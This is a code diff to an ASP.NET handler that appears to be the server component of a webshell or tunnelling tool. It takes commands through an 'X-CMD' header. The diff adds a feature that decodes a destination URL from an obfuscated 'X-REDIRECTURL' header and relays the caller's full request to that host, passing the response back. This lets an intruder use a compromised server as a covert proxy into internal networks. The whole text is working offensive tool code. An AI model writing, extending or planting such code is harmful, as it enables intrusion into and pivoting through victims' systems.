@@ -2,6 +2,7 @@
 
 using System;
 using System.Web;
+using System.IO;
 using System.Net;
 using System.Net.Sockets;
 
@@ -19,9 +20,52 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
     }
     public void ProcessRequest (HttpContext context) {
         try {
-            context.Response.StatusCode = HTTPCODE;
             String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
             String de = "BASE64 CHARSLIST";
+            String rUrl = context.Request.Headers.Get("X-REDIRECTURL");
+            if (rUrl != null){
+                Uri u = new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(StrTr(rUrl, de, en))));
+                WebRequest request = WebRequest.Create(u);
+                request.Method = context.Request.HttpMethod;
+                
+                foreach (string key in context.Request.Headers)
+                {
+                    if (key != "X-REDIRECTURL"){
+                        try{
+                            request.Headers.Add(key, context.Request.Headers.Get(key));
+                        } catch (Exception e){}
+                    }
+                }
+
+                int buffLen = context.Request.ContentLength;
+                byte[] buff = new byte[buffLen];
+                int c = 0;
+                if((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
+                    System.Text.Encoding.Default.GetString(buff);
+                    try{
+                        Stream body = request.GetRequestStream();
+                        body.Write(buff, 0, buff.Length);
+                        body.Close();
+                    } catch (Exception e){}
+                }
+
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                WebHeaderCollection webHeader = response.Headers;
+                for (int i=0;i < webHeader.Count; i++)
+                {
+                    string rkey = webHeader.GetKey(i);
+                    if (rkey != "Content-Length" && rkey != "Transfer-Encoding")
+                        context.Response.AddHeader(rkey, webHeader[i]);
+                }
+
+                StreamReader repBody = new StreamReader(response.GetResponseStream(), System.Text.Encoding.GetEncoding("UTF-8"));
+                string rbody = repBody.ReadToEnd();
+                context.Response.AddHeader("Content-Length", rbody.Length.ToString());
+                context.Response.Write(rbody);
+                return;
+            }
+
+            context.Response.StatusCode = HTTPCODE;
             String cmd = context.Request.Headers.Get("X-CMD");
             if (cmd != null) {
                 String mark = cmd.Substring(0,22);
